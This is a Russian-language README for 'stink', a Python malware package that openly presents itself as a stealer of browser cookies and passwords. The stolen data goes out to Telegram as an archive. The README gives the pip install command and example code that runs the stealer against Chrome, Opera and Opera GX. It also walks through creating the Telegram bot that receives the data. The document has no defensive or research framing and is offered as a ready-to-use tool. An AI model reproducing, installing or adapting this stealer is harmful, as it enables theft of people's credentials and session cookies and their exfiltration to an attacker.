# stink

Стиллер куки и паролей с отправкой в Telegram.

## Описание
`stink` в данный момент только начинает своё развитие. В будущем его функционал будет расширен.

## Навигация
* [Текущие возможности](#Текущие-возможности)
* [Будущие возможности](#Будущие-возможности)
* [Установка](#Установка)
* [Пример использования](#Пример-использования)
  * [Стандартный](#Стандартный)
  * [Кастомный](#Кастомный)
* [Настройка Telegram бота](#Настройка-Telegram-бота)
  * [Получение токена](#Получение-токена)
  * [Получение айди](#Получение-айди)

### Текущие возможности
1. Сбор куки и паролей следующих браузеров: Chrome, Opera, Opera GX.
2. Отправка собранных данных архивом в Telegram.
3. Выполнение в отдельном потоке.

### Будущие возможности
1. Добавление других браузеров.
2. Сбор информации о системе.
3. Сбор айпи и местоположения.
 
## Установка

Установить последнюю версию можно командой:
```
pip install stink==0.0.2
```

## Пример использования
### Стандартный
```python
from stink.multistealer import Stealer

stealer = Stealer(token="YOUR_TOKEN", user_id=YOUR_ID)
stealer.run()
```
### Кастомный
```python
from os import path, mkdir
from getpass import getuser

from stink.browsers.opera_gx import Opera_GX

storage_path = f"C:/Users/{getuser()}/AppData/"
storage_folder = "files/"


def main():

    if not path.exists(storage_path + storage_folder):
        mkdir(storage_path + storage_folder)

    stealer = Opera_GX(storage_path=storage_path, storage_folder=storage_folder)
    stealer.run()


if __name__ == "__main__":
    main()

```
## Настройка Telegram бота
### Получение токена
1. Открываем чат с [BotFather](https://t.me/botfather).
2. Прописываем команду ```/newbot```.

<p align="left">
  <a href="">
    <img src="docs/_1.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Прописываем название бота с прикладкой ```_bot``` в конце.

<p align="left">
  <a href="">
    <img src="docs/_2.png" width="500px" style="display: inline-block;">
  </a>
</p>

4. Полученный токен вставляем в поле ```"YOUR_TOKEN"``` в скрипте.

### Получение айди
1. Открываем чат с [Get My ID](https://t.me/getmyid_bot).
2. Прописываем команду ```/start```.

<p align="left">
  <a href="">
    <img src="docs/_3.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Полученный айди вставляем в поле ```YOUR_ID``` в скрипте.
